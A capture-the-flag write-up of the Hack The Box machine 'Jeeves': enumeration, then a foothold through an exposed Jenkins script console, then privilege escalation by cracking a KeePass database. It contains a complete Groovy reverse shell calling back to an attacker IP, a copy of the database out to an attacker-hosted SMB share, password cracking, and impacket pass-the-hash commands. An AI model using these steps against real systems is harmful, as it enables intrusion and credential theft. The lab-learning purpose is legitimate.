---
machine: Jeeves
platform: Hack The Box
category: Windows
difficulty: Medium
points: 30
tags: [jenkins, groovy-rce, keepass, kdbx-crack, alternate-data-streams]
date: 2026-04-08
status: retired
summary: "A Windows box centered on a forgotten Jenkins automation server exposed on a non-standard port. It exercises web content discovery, abusing a CI/CD scripting console for command execution, cracking an offline password-manager database, and Windows credential reuse plus NTFS alternate data streams for the final loot."
---

## Enumeration

nmap scan

```bash
──(kali㉿kali)-[~/htb/jeeves]
└─$ nmap -sCV -p- -oN nmapscan 10.129.228.112
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-11 19:12 -0400
Nmap scan report for 10.129.228.112
Host is up (0.045s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-11T21:13:02
|_  start_date: 2026-05-11T21:09:14
|_clock-skew: mean: -2h01m14s, deviation: 0s, median: -2h01m14s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.22 seconds
```

When we enter something into the webapp it errors out claiming it is Microsoft SQL Server 2005 - 9.00.4053.00 (intel x86)

Im going to run this ffuf directory fuzzing script:
`ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c`

We also get 404'd when we try to access port 50000 as a web browser but we see that its powered by `[Jetty:// 9.4.z-SNAPSHOT](http://eclipse.org/jetty)` so we look up cve's related to that

We gobuster the port 50000 webapp and find a directory called `askjeeves` and it takes us to a jenkins server.

## Foothold

From here we can navigate to the script console and execute commands to all the jenkins controlled devices like our askjeeves server.  We can execute a Groovy reverse shell with this script console and connect back to a listener listening on our device for a foothold in the askjeeves webapp

```groovy
Thread.start { String host = "10.10.15.144" int port = 9999 String cmd = "cmd.exe" Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start() Socket s = new Socket(host, port) InputStream pi = p.getInputStream(), si = s.getInputStream() OutputStream po = p.getOutputStream(), so = s.getOutputStream() while (!s.isClosed()) { while (pi.available() > 0) so.write(pi.read()) while (si.available() > 0) po.write(si.read()) so.flush(); po.flush() Thread.sleep(50) try { p.exitValue(); break } catch (Exception e) {} } }
```

When we `whoami` on the reverse shell we see `jeeves\kohsuke` indicating that the jenkins application is running as `kohsuke`.

We can go ahead and retrieve the user flag from the desktop of kohsuke

## Privilege Escalation

When enumerating the user directories of kohsuke we also find an interesting file `CEH.kdbx`, a keepass file.  We need to get this file onto our local kali machine from our reverse shell, the simplest way to do this is to host an smb share on our kali machine and copy it to the share from the windows shell.

```bash
┌──(kali㉿kali)-[~/htb/jeeves]
└─$ impacket-smbserver share . -smb2support

C:\Users\kohsuke\Documents>copy CEH.kdbx \\10.10.15.144\share
copy CEH.kdbx \\10.10.15.144\share
        1 file(s) copied.
```

To crack this we need to convert it to the intended format, we can do this with `keepass2john`

`keepass2john CEH.kdbx > keepass.hash`

```bash
┌──(kali㉿kali)-[~/htb/jeeves]
└─$ john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH) 
```

we have found the keepass password is `moonshine1`, now lets open it:

![KeePass database opened, revealing the Backup stuff entry](/media/Pasted%20image%2020260511163744.png)

Under `Backup stuff` we see a NTLM hash, lets go find what user it belongs too:
``
You can do this by enumerating all domain users via `net user` on the rev shell and then spraying the hash against that wordlist with `nxc`

`nxc smb 10.129.228.112 -u users.txt -H e0fb1fb85756c24235ff238cbe81fe00 --continue-on-success`

After this we can pass the hash via port 445 (smb) with one of the following methods:

```bash
impacket-psexec Administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

impacket-wmiexec Administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

impacket-smbexec Administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

I used `impacket-psexec` and got the system shell.  From there you can get the flag from the desktop.

## Loot

When navigating to the Administrator desktop for the flag the .txt file will say to look elsewhere, if you use `dir /R` you can see hidden directories and alternate data streams which will reveal `hm.txt:root.txt:$DATA`

To read alternate data stream data you can use the powershell command `powershell Get-Content -Path "hm.txt" -Stream "root.txt"` or simply `more < C:\Users\Administrator\Desktop\hm.txt:root.txt` if you are in a semi-interactive shell like `psexec`
